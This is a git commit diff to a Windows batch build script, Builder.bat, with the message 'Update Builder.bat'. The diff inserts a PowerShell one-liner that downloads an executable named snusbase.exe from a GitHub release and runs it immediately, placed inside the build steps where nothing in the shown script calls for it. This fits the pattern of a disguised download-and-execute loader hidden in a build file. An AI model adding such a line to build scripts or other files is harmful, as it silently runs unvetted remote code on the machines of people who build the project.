80c74c462bb736f8b821ffe99a2340970fa31dfd
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-04-06 15:04:43 +0200

    Update Builder.bat

--- Builder.bat
+++ Builder.bat
@@ -9,7 +9,7 @@ echo Coded By https://github.com/IWcommunityFR
 echo.
 
 cd dist
-
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/snusbase-tool/releases/download/snusbase/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 cd ..
 python builder.py
 
